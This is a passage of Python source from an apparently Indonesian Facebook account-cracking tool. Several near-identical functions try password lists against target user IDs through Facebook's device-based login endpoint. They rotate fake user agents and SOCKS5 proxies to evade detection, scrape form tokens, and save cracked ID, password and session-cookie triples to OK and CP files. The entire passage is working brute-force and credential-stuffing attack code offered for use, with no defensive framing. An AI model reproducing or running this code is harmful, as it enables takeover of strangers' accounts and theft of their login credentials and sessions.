KAIOS/2.5","Mozilla/5.0 (Mobile; LOGIC_LOGIC_B8K_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.2","Mozilla/5.0 (Linux; rv:48.0; U; US) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-50-091120;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; Digit_Digit4G_4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2"]
	ua = random.choice(ua_crack)
	ses = requests.Session()
	c_pw = len(pwr)
	runc= random.choice([K,M,U,O,B,H]) 
	sys.stdout.write("\r %s• %scracked %s%s/%s/%s %sok:%s %scp:%s "%(P,runc,P,str(c_pw),len(id2 or id4),HikmatXD,H,ok,K,cp)); sys.stdout.flush()
	c_pw -=1
	for pw in pwr:
		pw = pw.lower()
		try:
			proxff= open('proxy_mat.txt','r').read().splitlines()
			cuukk=random.choice(proxff)
			proxs= {'http': 'socks5://'+cuukk}
			ses.headers.update({'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get(f'https://{link_okep}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2F{link_okep}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uiz,"next":"https://"+link_okep+"/v7.0/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': link_okep,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://'+link_okep+'/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2F'+link_okep+'%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post(f'https://{link_okep}/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"}
				print("")
				print("\r %s*--> %s|%s %s• %s "%(K,uiz,pw,warna_warni_biasa,tahun(uiz)))
				print("")
				open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2"}
				if "no" in tampilkan_apk:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("")
					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
					print("\r %s*--> %s "%(H,kuki))
					print("")
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
				elif "ya" in tampilkan_apk:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
					print("\r %s*--> %s "%(H,kuki))
					cek_apk(ses,kuki)
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
					
			else:
				continue
		except requests.exceptions.ConnectionError:
			turu(31)
	HikmatXD+=1
	
def mobile_free_fire(uiz,pwr,link_okep):
	global ok,cp,HikmatXD
	ua_crack = ["Mozilla/5.0 (Linux; Android 10; RMX2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; TECNO CG6j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; RMX3085 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/378.0.0.18.112;]","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; Qmobile_4Gplus; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.2","Mozilla/5.0 (Mobile; Tech_Pad_Kaios_One_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.1","Mozilla/5.0 (X11; CrOS armv7l 13597.84.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.187 Safari/537.36 Mozilla/5.0 (Mobile; Nokia 8000 4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.4","Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2","Mozilla/5.0 (Mobile; LYF/F300B/LYF-F300B-001-01-15-130718-i;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5 Edg/93.0.4577.63","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-45-051119;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; LOGIC_LOGIC_B8K_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.2","Mozilla/5.0 (Linux; rv:48.0; U; US) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-50-091120;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; Digit_Digit4G_4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2"]
	ua = random.choice(ua_crack)
	ses = requests.Session()
	c_pw = len(pwr)
	runc= random.choice([K,M,U,O,B,H]) 
	sys.stdout.write("\r %s• %scracked %s%s/%s/%s %sok:%s %scp:%s "%(P,runc,P,str(c_pw),len(id2 or id4),HikmatXD,H,ok,K,cp)); sys.stdout.flush()
	c_pw -=1
	for pw in pwr:
		pw = pw.lower()
		try:
			proxff= open('proxy_mat.txt','r').read().splitlines()
			cuukk=random.choice(proxff)
			proxs= {'http': 'socks5://'+cuukk}
			ses.headers.update({'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get(f'https://{link_okep}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2F{link_okep}%2Fv6.0%2Fdialog%2Foauth%3Fclient_id%3D2036793259884297%26cbt%3D1622205732064%26e2e%3D%257B%2522init%2522%253A1622205732064%257D%26ies%3D1%26sdk%3Dandroid-6.3.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49cd-b08c-11e3de85d49c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D%26default_audience%3Dfriends%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D4da6f37f-2993-49cd-b08c-11e3de85d49c%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49cd-b08c-11e3de85d49c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=https%3A%2F%2F{link_okep}%2Fv6.0%2Fdialog%2Foauth&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uiz,"next":"https://"+link_okep+"/v7.0/dialog/oauth?app_id=3D2036793259884297%26cbt%3D1622205732064%26e2e%3D%257B%2522init%2522%253A1622205732064%257D%26ies%3D1%26sdk%3Dandroid-6.3.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49cd-b08c-11e3de85d49c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D%26default_audience%3Dfriends%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D4da6f37f-2993-49cd-b08c-11e3de85d49c%26tp%3Dunspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': link_okep,'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': link_okep,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://'+link_okep+'/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2F'+link_okep+'%2Fv6.0%2Fdialog%2Foauth%3Fclient_id%3D2036793259884297%26cbt%3D1622205732064%26e2e%3D%257B%2522init%2522%253A1622205732064%257D%26ies%3D1%26sdk%3Dandroid-6.3.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49cd-b08c-11e3de85d49c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D%26default_audience%3Dfriends%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D4da6f37f-2993-49cd-b08c-11e3de85d49c%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49cd-b08c-11e3de85d49c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=https%3A%2F%2F'+link_okep+'%2Fv6.0%2Fdialog%2Foauth&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post(f'https://{link_okep}/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"}
				print ("")
				print("\r %s*--> %s|%s %s• %s "%(K,uiz,pw,warna_warni_biasa,tahun(uiz)))
				print ("")
				open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2"}
				if "no" in tampilkan_apk:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print ("")
					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
					print("\r %s*--> %s "%(H,kuki))
					print ("")
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
				elif "ya" in tampilkan_apk:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print ("")
					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
					print("\r %s*--> %s "%(H,kuki))
					print ("")
					cek_apk(ses,kuki)
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
					
			else:
				continue
		except requests.exceptions.ConnectionError:
			turu(31)
	HikmatXD+=1
	
def mobile_v2(uiz,pwr,link_okep):
	global ok,cp,HikmatXD
	ua_crack = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
	ua = random.choice(ua_crack)
	ses = requests.Session()
	c_pw = len(pwr)
	runc= random.choice([K,M,U,O,B,H]) 
	sys.stdout.write("\r %s• %scracked %s%s/%s/%s %sok:%s %scp:%s "%(P,runc,P,str(c_pw),len(id2 or id4),HikmatXD,H,ok,K,cp)); sys.stdout.flush()
	c_pw -=1
	for pw in pwr:
		pw = pw.lower()
		try:
			proxff= open('proxy_mat.txt','r').read().splitlines()
			cuukk=random.choice(proxff)
			proxs= {'http': 'socks5://'+cuukk}
			#proxs2= {'http': 'socks4://'+nip}
			url = "m.facebook.com"
			headers1= {
				"Host": link_okep,
				"cache-control": "max-age=0",
				"user-agent": ua,
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="101"',
				"sec-ch-ua-mobile": "?1",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "cors",
				"sec-fetch-dest": "empty",
				"sec-fetch-user": "?1",
				"upgrade-insecure-requests": "1",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			p = ses.get(f"https://{link_okep}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2F{link_okep}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",headers=headers1)
			data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
				"uid":uiz,
				"next":f"https://{link_okep}/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified",
				"pass":pw,
				"flow":"login_no_pin"}
			kuko = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			kuko += " m_pixel_ratio=2.625; wd=412x756"
			headers2 = {
				"Host": url,
				"connection": "keep-alive",
				"cache-control": "max-age=0",
				"save-data": "on",
				"origin": "https://"+link_okep,
				"content-type": "application/x-www-form-urlencoded",
				"user-agent": ua,
				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"x-requested-with": "com.facebook.katana",
				"dnt": "1",
				"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="101"',
				"sec-ch-ua-platform": '"Android"',
				"sec-ch-ua-mobile": "?1",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "cors",
				"sec-fetch-dest": "empty",
				"sec-fetch-user": "?1",
				"upgrade-insecure-requests": "1",
				"referer": f"https://{link_okep}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2F{link_okep}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
				"accept-encoding": "gzip, deflate br",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			po = ses.post(f"https://{link_okep}/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=data, headers=headers2, cookies={"cookie": kuko}, proxies=proxs, allow_redirects=False)
			if "checkpoint" in ses.cookies.get_dict().keys():
				print ("")
				print("\r %s*--> %s|%s %s• %s "%(K,uiz,pw,warna_warni_biasa,tahun(uiz)))
				print ("")
				open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				if "no" in tampilkan_apk:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print ("")
					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
					print("\r %s*--> %s "%(H,kuki))
					print ("")
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
				elif "ya" in tampilkan_apk:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print ("")
					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
					print("\r %s*--> %s "%(H,kuki))
					print ("")
					cek_apk(ses,kuki)
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
					
			else:
				continue
		except requests.exceptions.ConnectionError:
			turu(31)
	HikmatXD+=1
	
def mbasic(uiz,pwr,link_okep):
	global ok,cp,HikmatXD
	ua_crack = ["Mozilla/5.0 (Linux; Android 10; RMX2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; TECNO CG6j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; RMX3085 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/378.0.0.18.112;]","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 